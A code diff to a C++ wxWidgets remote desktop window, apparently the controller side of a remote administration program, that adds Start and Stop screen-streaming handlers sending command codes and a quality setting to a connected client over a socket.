@@ -9,6 +9,8 @@ extern std::mutex vector_mutex;
 wxBEGIN_EVENT_TABLE(frameRemoteDesktop, wxFrame)
 	EVT_CLOSE(frameRemoteDesktop::Onclose)
 	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Single, frameRemoteDesktop::OnSingle)
+	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Start, frameRemoteDesktop::OnStart)
+	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Stop, frameRemoteDesktop::OnStop)
 wxEND_EVENT_TABLE()
 
 frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
@@ -35,7 +37,6 @@ frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
 	wxButton* btn_Detener = new wxButton(this, EnumRemoteDesktop::ID_BTN_Stop, "Detener");
 	wxButton* btn_Guardar = new wxButton(this, EnumRemoteDesktop::ID_BTN_Save, "Guardar Captura");
 	wxCheckBox* chk_Control = new wxCheckBox(this, EnumRemoteDesktop::ID_CHK_Control, "Control Remoto (mouse y teclado)");
-	btn_Detener->Enable(false);
 	
 	wxBoxSizer* sizer_controles = new wxBoxSizer(wxHORIZONTAL);
 
@@ -62,8 +63,23 @@ frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
 void frameRemoteDesktop::OnSingle(wxCommandEvent&) {
 	std::string strComando = std::to_string(EnumComandos::RD_Single);
 	strComando.append(1, CMD_DEL);
-	strComando += "32"; //quality
+	strComando += "24"; //quality
 	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+}
+
+void frameRemoteDesktop::OnStart(wxCommandEvent&) {
+	std::string strComando = std::to_string(EnumComandos::RD_Start);
+	strComando.append(1, CMD_DEL);
+	strComando += "24"; //quality
+	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+}
+
+void frameRemoteDesktop::OnStop(wxCommandEvent&) {
+	std::string strComando = std::to_string(EnumComandos::RD_Stop);
+	strComando.append(1, CMD_DEL);
+	strComando.append(1, '0');
+	int iSent = p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+	std::cout << "[RD] " << iSent << " enviardos\n";
 }
 
 void frameRemoteDesktop::OnDrawBuffer(const char* cBuffer, int iBuffersize) {
